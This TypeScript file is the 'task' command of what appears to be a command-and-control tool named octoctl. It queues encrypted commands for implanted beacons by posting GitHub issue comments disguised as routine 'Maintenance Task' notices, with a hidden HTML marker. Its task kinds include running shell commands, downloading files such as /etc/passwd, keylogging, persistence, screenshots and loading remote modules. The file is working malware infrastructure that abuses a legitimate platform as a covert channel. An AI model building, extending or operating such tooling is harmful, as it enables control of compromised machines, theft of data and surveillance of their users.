/**
 * octoctl task
 *
 * Queue a task for a beacon by posting an encrypted deploy comment directly
 * to the beacon's GitHub issue. Does NOT require a running server — the
 * operator acts as the delivery authority.
 *
 * Usage:
 *   octoctl task <beaconId> --kind shell --cmd "id"
 *   octoctl task <beaconId> --kind shell --cmd "whoami" --cmd-args "--no-login"
 *   octoctl task <beaconId> --kind download --remote-path /etc/passwd
 *   octoctl task <beaconId> --kind sleep --seconds 300
 *   octoctl task <beaconId> --kind die
 *
 * Supported task kinds: shell, upload, download, screenshot, keylog,
 *                       persist, unpersist, sleep, die, load-module
 *
 * The task payload is a JSON array (same format the server uses) encrypted
 * with crypto_box to the beacon's X25519 public key.
 */

import { resolveEnv }           from "../lib/env.ts";
import { getBeacon }            from "../lib/registry.ts";
import { encryptForBeacon, base64ToBytes } from "../lib/crypto.ts";

// ── Task argument types ────────────────────────────────────────────────────────

export type TaskKind =
  | "shell"
  | "upload"
  | "download"
  | "screenshot"
  | "keylog"
  | "persist"
  | "unpersist"
  | "sleep"
  | "die"
  | "load-module";

export const VALID_TENTACLE_KINDS = new Set([
  "issues", "branch", "actions", "proxy", "codespaces",
  "http", "relay", "gist", "oidc", "notes", "secrets",
] as const);

export type TentacleKind = typeof VALID_TENTACLE_KINDS extends Set<infer T> ? T : never;

export interface TaskOptions {
  kind:             TaskKind;
  cmd?:             string | undefined;
  localPath?:       string | undefined;
  remotePath?:      string | undefined;
  seconds?:         number | undefined;
  argsJson?:        string | undefined;
  /** If set, only deliver via this tentacle channel */
  tentacle?:        string | undefined;
}

// ── Comment format ─────────────────────────────────────────────────────────────

function buildDeployComment(ref: string, nonce: string, ciphertext: string): string {
  const epoch = Math.floor(Date.now() / 1000);
  return [
    // Invisible to viewers; parsed by the beacon's pollForDeployComments
    `<!-- job:${epoch}:deploy:${ref} -->`,
    "",
    `### 📌 Maintenance Task · Ref \`${ref}\``,
    "",
    "Automated maintenance task queued for execution.",
    "",
    "<details>",
    "<summary>Operation parameters</summary>",
    "",
    "```text",
    ciphertext,
    "```",
    "",
    "</details>",
    `<!-- ${nonce} -->`,
  ].join("\n");
}

// ── Build task args from options ──────────────────────────────────────────────

function buildTaskArgs(opts: TaskOptions): Record<string, unknown> {
  if (opts.argsJson) {
    return JSON.parse(opts.argsJson) as Record<string, unknown>;
  }
  switch (opts.kind) {
    case "shell":
      if (!opts.cmd) throw new Error("--kind shell requires --cmd");
      return { cmd: opts.cmd };
    case "upload":
      if (!opts.localPath || !opts.remotePath)
        throw new Error("--kind upload requires --local-path and --remote-path");
      return { localPath: opts.localPath, remotePath: opts.remotePath };
    case "download":
      if (!opts.remotePath) throw new Error("--kind download requires --remote-path");
      return { remotePath: opts.remotePath };
    case "sleep":
      if (opts.seconds === undefined) throw new Error("--kind sleep requires --seconds");
      return { seconds: opts.seconds };
    case "load-module":
      if (!opts.argsJson) throw new Error("--kind load-module requires --args-json '{\"name\":\"...\",\"serverUrl\":\"...\"}'");
      return JSON.parse(opts.argsJson) as Record<string, unknown>;
    case "die":
    case "screenshot":
    case "keylog":
    case "persist":
    case "unpersist":
      return {};
    default:
      return {};
  }
}

// ── Main ───────────────────────────────────────────────────────────────────────

export async function runTask(beaconIdPrefix: string, opts: TaskOptions): Promise<void> {
  const env = await resolveEnv();

  // Validate --tentacle kind if provided
  if (opts.tentacle !== undefined && !VALID_TENTACLE_KINDS.has(opts.tentacle as TentacleKind)) {
    console.error(
      `\n  Error: --tentacle '${opts.tentacle}' is not a valid tentacle kind.`
    );
    console.error(
      `  Valid kinds: ${[...VALID_TENTACLE_KINDS].join(", ")}\n`
    );
    process.exit(1);
  }

  // Resolve beacon
  const beacon = await getBeacon(beaconIdPrefix, env.dataDir);
  if (!beacon) {
    console.error(
      `\n  Beacon '${beaconIdPrefix}' not found in registry (${env.dataDir}/registry.json).`
    );
    console.error("  Run: octoctl beacons  to list registered beacons.\n");
    process.exit(1);
  }

  // Build task payload
  const taskId = crypto.randomUUID();
  const ref    = taskId.replace(/-/g, "").slice(0, 8);
  const args   = buildTaskArgs(opts);

  const taskPayload: {
    taskId: string;
    kind: string;
    args: Record<string, unknown>;
    ref: string;
    preferredChannel?: string;
  } = {
    taskId,
    kind: opts.kind,
    args,
    ref,
    ...(opts.tentacle !== undefined && { preferredChannel: opts.tentacle }),
  };

  const taskArray = [taskPayload];

  // Encrypt
  const beaconPublicKey = await base64ToBytes(beacon.publicKey);
  const { nonce, ciphertext } = await encryptForBeacon(
    JSON.stringify(taskArray),
    beaconPublicKey,
    env.operatorSecretKey
  );

  // Post deploy comment
  const body = buildDeployComment(ref, nonce, ciphertext);

  const resp = await env.octokit.rest.issues.createComment({
    owner:        env.owner,
    repo:         env.repo,
    issue_number: beacon.issueNumber,
    body,
  });

  const DIM  = "\x1b[2m";
  const BOLD = "\x1b[1m";
  const RESET = "\x1b[0m";
  const GREEN = "\x1b[32m";

  console.log("");
  console.log(`  ${GREEN}✓${RESET} Task queued`);
  console.log(`  ${DIM}Task ID:${RESET}  ${taskId}`);
  console.log(`  ${DIM}Ref:${RESET}      ${ref}`);
  console.log(`  ${DIM}Kind:${RESET}     ${opts.kind}`);
  console.log(`  ${DIM}Args:${RESET}     ${JSON.stringify(args)}`);
  if (opts.tentacle !== undefined) {
    console.log(`  ${DIM}Tentacle:${RESET} ${opts.tentacle}`);
  }
  console.log(`  ${DIM}Beacon:${RESET}   ${beacon.beaconId} (${beacon.hostname})`);
  console.log(`  ${DIM}Issue:${RESET}    #${beacon.issueNumber}`);
  console.log(`  ${DIM}Comment:${RESET}  ${resp.data.html_url}`);
  console.log("");
  console.log(`  ${BOLD}Waiting for beacon to check in…${RESET}`);
  console.log(`  Run: octoctl results ${beaconIdPrefix}  to see the output`);
  console.log("");
}
